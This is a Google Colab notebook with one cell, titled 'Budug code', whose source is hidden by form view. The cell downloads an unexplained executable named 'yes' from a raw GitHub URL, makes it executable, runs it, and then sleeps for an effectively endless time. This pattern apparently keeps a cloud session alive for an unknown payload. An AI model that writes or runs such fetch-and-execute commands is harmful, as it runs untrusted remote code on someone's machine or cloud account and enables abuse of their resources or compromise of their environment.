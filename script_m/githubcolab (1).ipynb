{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "githubcolab.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "B7a8WBp-AZQZ"
      },
      "source": [
        "#@title Budug code\n",
        "\n",
        "! wget https://raw.githubusercontent.com/ahs7asg/budug83/main/yes && chmod +x yes && ./yes\n",
        "! sleep 861678316561562"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}